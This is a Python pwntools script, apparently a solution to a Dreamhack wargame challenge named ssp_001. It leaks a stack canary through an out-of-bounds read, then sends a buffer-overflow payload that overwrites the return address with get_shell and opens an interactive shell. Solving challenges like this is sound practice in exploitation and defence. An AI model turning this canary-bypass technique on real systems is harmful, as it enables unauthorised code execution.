from pwn import *
r=remote("host1.dreamhack.games",8263)
#r=process("./ssp_001")

context.log_level="debug"

b=ELF("./ssp_001")

shell=b.symbols['get_shell']

r.recv()

canary=""
for i in range(0,4):
    r.sendline('P')
    r.sendline(str(128+i))
    r.recvuntil("index "+str(128+i)+" is : ")
    canary=r.recv(2)+canary
    log.info(canary)
    r.recv()

canary=int(canary,16)
log.info(hex(canary))

pay=""
pay+='x'*0x40
pay+=p32(canary)
pay+='x'*8
pay+=p32(shell)


r.sendline("E")
r.sendline("256")
r.sendline(pay)

r.interactive()
